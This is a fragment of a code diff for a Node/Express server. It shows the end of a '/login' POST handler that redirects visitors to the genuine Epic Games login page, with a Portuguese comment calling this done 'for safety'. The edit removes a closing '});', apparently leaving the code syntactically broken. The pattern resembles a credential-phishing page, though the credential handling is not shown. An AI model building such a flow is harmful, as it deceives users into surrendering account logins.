@@ -48,7 +48,7 @@ app.post('/login', (req, res) => {
         }
         // O redirecionamento acontece aqui dentro por segurança
         res.redirect('https://www.epicgames.com/id/login');
-    });
+    
 });
 
 const PORT = process.env.PORT || 10000;
